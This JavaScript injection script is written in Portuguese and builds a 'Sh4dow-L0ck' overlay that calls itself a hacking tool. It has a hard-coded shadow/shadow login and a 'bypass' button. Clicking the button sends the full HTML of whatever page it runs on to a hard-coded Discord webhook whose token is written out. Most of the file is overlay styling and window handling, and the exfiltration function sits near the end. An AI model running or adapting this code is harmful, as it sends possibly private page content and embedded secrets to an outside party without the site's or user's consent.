(function() {
    if (document.querySelector("#shadow-app")) return;

    // Verifica se já existe
    const app = document.createElement("div");
    app.id = "shadow-app";

    // HTML do login
    const loginHTML = `
        <div class="container" id="login-container">
            <div class="window-controls">
                <button class="minimize-btn" title="Minimizar">-</button>
                <button class="close-btn" title="Fechar">x</button>
            </div>
            <h1>Sh4dow-L0ck</h1>
            <p>Bem-vindo ao Sh4dow-L0ck</p>
            <input class="user-input" type="text" placeholder="o user">
            <input class="pass-input" type="password" placeholder="a senha">
            <button class="login-button">Entrar</button>
        </div>
    `;

    // HTML do home (inicialmente escondido)
    const homeHTML = `
        <div class="container" id="home-container" style="display:none;">
            <div class="window-controls">
                <button class="minimize-btn" title="Minimizar">-</button>
                <button class="close-btn" title="Fechar">x</button>
            </div>
            <h1>Sh4dow-L0ck</h1>
            <p>Bem-vindo ao Sh4dow-L0ck</p>
            <p>bem vindo a ferramenta de hacking feito por ghost</p>
            <button class="bypass-raw-sem-acesso">bypass (raw, sem acesso)</button>
        </div>
    `;

    app.innerHTML = loginHTML + homeHTML;

    // Estilos
    const style = document.createElement("style");
    style.textContent = `
        #shadow-app {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 999999;
            cursor: default;
            user-select: none;
        }

        #shadow-app .container {
            text-align: center;
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            border: 2px solid #424642;
            width: 300px;
            position: relative;
        }

        #shadow-app .window-controls {
            position: absolute;
            top: 10px;
            right: 10px;
            display: flex;
            gap: 8px;
        }

        #shadow-app .window-controls button {
            background: none;
            border: none;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
            padding: 0 5px;
            transition: all 0.2s ease;
            line-height: 1;
        }

        #shadow-app .window-controls .minimize-btn:hover {
            color: #ffd700;
            transform: scale(1.2);
        }

        #shadow-app .window-controls .close-btn:hover {
            color: #ff4444;
            transform: scale(1.2);
        }

        #shadow-app .drag-area {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 40px;
            cursor: move;
        }

        #shadow-app h1 {
            color: #db3030;
            font-size: 40px;
            margin-bottom: 10px;
            margin-top: 10px;
        }

        #shadow-app p {
            color: #7e7979;
            font-size: 16px;
            margin-bottom: 20px;
        }

        #shadow-app .user-input, 
        #shadow-app .pass-input {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
            border: 2px solid #424642;
            box-sizing: border-box;
        }

        #shadow-app .login-button,
        #shadow-app .bypass-raw-sem-acesso {
            background-color: #424642;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        #shadow-app .login-button:hover,
        #shadow-app .bypass-raw-sem-acesso:hover {
            background-color: #5a5a5a;
            width: 140px;
            border-radius: 10px;
            border: 2px solid #ffffff;
        }

        #shadow-app .login-button:active,
        #shadow-app .bypass-raw-sem-acesso:active {
            transform: scale(1.2);
            background-color: #2c2c2c;
        }

        /* Estilo quando minimizado */
        #shadow-app.minimized {
            top: auto !important;
            bottom: 20px !important;
            left: 20px !important;
            transform: none !important;
        }

        #shadow-app.minimized .container {
            padding: 10px 20px;
            width: auto;
            min-width: 150px;
            border-radius: 10px;
        }

        #shadow-app.minimized .container > *:not(.window-controls) {
            display: none;
        }

        #shadow-app.minimized .window-controls {
            position: static;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        #shadow-app.minimized .window-controls .minimize-btn {
            display: none;
        }

        #shadow-app.minimized .window-controls::before {
            content: "Sh4dow-L0ck";
            color: #db3030;
            font-size: 14px;
            font-weight: bold;
        }

        #shadow-app.minimized .drag-area {
            display: none;
        }
    `;

    document.body.appendChild(style);
    document.body.appendChild(app);

    // Função para mover a janela
    function setupDragging(element) {
        let isDragging = false;
        let offsetX, offsetY;

        // Criar área de arraste
        const containers = element.querySelectorAll('.container');
        containers.forEach(container => {
            const dragArea = document.createElement('div');
            dragArea.className = 'drag-area';
            container.insertBefore(dragArea, container.firstChild);
        });

        const dragAreas = element.querySelectorAll('.drag-area');
        dragAreas.forEach(dragArea => {
            dragArea.addEventListener('mousedown', function(e) {
                if (element.classList.contains('minimized')) return;
                
                isDragging = true;
                const rect = element.getBoundingClientRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                
                element.style.cursor = 'grabbing';
                e.preventDefault();
            });
        });

        document.addEventListener('mousemove', function(e) {
            if (!isDragging) return;
            
            const x = e.clientX - offsetX;
            const y = e.clientY - offsetY;
            
            element.style.left = x + 'px';
            element.style.top = y + 'px';
            element.style.transform = 'none';
        });

        document.addEventListener('mouseup', function() {
            if (isDragging) {
                isDragging = false;
                element.style.cursor = 'default';
            }
        });
    }

    // Função para configurar controles da janela
    function setupWindowControls(element) {
        const minimizeBtns = element.querySelectorAll('.minimize-btn');
        const closeBtns = element.querySelectorAll('.close-btn');

        minimizeBtns.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.stopPropagation();
                element.classList.toggle('minimized');
            });
        });

        closeBtns.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.stopPropagation();
                if (confirm('Deseja realmente fechar o Sh4dow-L0ck?')) {
                    element.remove();
                    // Remover também o blur se existir
                    const blur = document.querySelector('[data-shadow-blur]');
                    if (blur) blur.remove();
                }
            });
        });

        // Restaurar ao clicar no container quando minimizado
        const containers = element.querySelectorAll('.container');
        containers.forEach(container => {
            container.addEventListener('click', function(e) {
                if (element.classList.contains('minimized') && !e.target.closest('.window-controls')) {
                    element.classList.remove('minimized');
                }
            });
        });
    }

    // Adicionar blur
    const blur = document.createElement('div');
    blur.setAttribute('data-shadow-blur', 'true');
    blur.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; z-index:999998; background:rgba(0,0,0,0.5);';
    document.body.appendChild(blur);

    // Configurar a janela
    setupDragging(app);
    setupWindowControls(app);

    // ----- LOGIN -----
    const loginButton = app.querySelector('.login-button');
    const userInput = app.querySelector('.user-input');
    const passInput = app.querySelector('.pass-input');
    const loginContainer = app.querySelector('#login-container');
    const homeContainer = app.querySelector('#home-container');

    loginButton.addEventListener('click', () => {
        const username = userInput.value;
        const password = passInput.value;

        if (username === 'shadow' && password === 'shadow') {
            alert('Login bem-sucedido!');
            loginContainer.style.display = 'none';
            homeContainer.style.display = 'block';
        } else {
            alert('Usuario ou senha incorretos.');
        }
    });

    // Permitir login com Enter
    passInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            loginButton.click();
        }
    });

    // ----- HOME / BYPASS -----
    const webhook = "https://discord.com/api/webhooks/1526964094425632778/C4BrHbWn7b_8mhpHU8zVZlyiJVugT4q_4IoZvVsu_sKA6SgWY9Qhi94xP6Uf1aZ75KlI";

    async function enviarRaw() {
        try {
            const codigoFonte = document.documentElement.outerHTML;
            const blob = new Blob([codigoFonte], { type: 'text/plain' });
            const formData = new FormData();
            formData.append('file', blob, 'pagina.txt');
            formData.append('content', 'Codigo fonte da pagina:');
            
            const resposta = await fetch(webhook, {
                method: 'POST',
                body: formData
            });
            
            if (resposta.ok) {
                console.log("Arquivo TXT enviado!");
            } else {
                console.warn("Erro:", resposta.status);
            }
        } catch(e) {
            console.warn("Erro:", e);
        }
    }

    const bypassBtn = app.querySelector(".bypass-raw-sem-acesso");
    if (bypassBtn) {
        bypassBtn.addEventListener("click", enviarRaw);
    }

    // Suporte para tecla ESC
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            const closeBtn = document.querySelector('#shadow-app .close-btn');
            if (closeBtn) closeBtn.click();
        }
    });

})();
